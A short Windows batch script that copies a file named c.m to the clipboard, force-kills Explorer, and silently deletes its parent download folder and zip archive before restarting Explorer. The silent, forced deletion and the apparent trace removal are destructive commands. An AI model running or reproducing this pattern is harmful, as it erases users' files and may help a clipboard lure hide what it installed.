@echo off
setlocal enabledelayedexpansion

:: Copy content of c.m to clipboard
type c.m | clip

:: Brief pause to ensure clipboard operation completes
timeout /t 1 /nobreak > nul

:: Check if a.zip is in use, try to close processes using it
taskkill /f /im explorer.exe >nul 2>&1
timeout /t 1 /nobreak > nul

:: Remove directory a-main and delete a.zip
rmdir /s /q ..\a-main 2>nul
del /q /f ..\a.zip 2>nul

:: Restart explorer.exe if it was terminated
start explorer.exe
